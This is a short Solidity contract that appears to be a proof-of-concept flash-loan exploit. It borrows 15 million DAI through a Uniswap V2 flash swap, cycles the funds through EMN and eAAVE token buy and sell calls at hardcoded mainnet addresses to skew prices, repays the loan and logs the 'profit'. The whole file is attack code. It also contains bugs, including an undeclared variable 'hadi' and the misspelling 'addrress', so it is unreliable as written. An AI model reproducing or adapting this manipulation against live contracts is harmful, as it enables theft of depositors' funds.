pragma solidity ^0.5.0;

import "./IDAI.sol";
import "./IeAAVE.sol";
import "./IEMN.sol";
import "./IUNSwapPair.sol";
import "hardhat/console.sol";

contract test {

    IEMN emn = IEMN(0x5ade7aE8660293F2ebfcEfaba91d141d72d221e8);
    IeAAVE eAAVE = IeAAVE(0xc08f38f43ADB64d16Fe9f9eFCC2949d9eddEc198);
    IUNSwapPair pair = IUNSwapPair(0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11);
    IDAI dai = IDAI(0x6B175474E89094C44Da98b954EedeAC495271d0F);

    uint borrowed = 15000000000000000000000000;

    function start() {
        pair.swap(borrowed, 0, address(this), "0x");
    }

     function uniswapV2Call(address,uint,uint,bytes calldata) external {
         uint hdai = dai.balanceOf(address(this));
         console.log("DAI hacker:  ",hadi);
         dai.approve(emn, uint(-1));
         emn.buy(borrowed, 0);
         emn.approve(eAAVE, uint(-1));

         uint balance = emn.balanceOf(address(this));
         uint half = balance / 2;

         eAAVE.buy(half, 0);
         uint ebalance = eAAVE.balanceOf(addrress(this));
         emn.sell(half, 0);
         eAAVE.sell(ebalance,0);
         balance = emn.balanceOf(address(this));
         emn.sell(balance, 0);

         uint toreturn = (borrowed * 1000) / 997 +1;
         dai.transfer(address(pair), toreturn);

         hadi = dai.balanceOf(address(this));
         console.log("profit:  ",hadi / 1 ether);
        
     }

}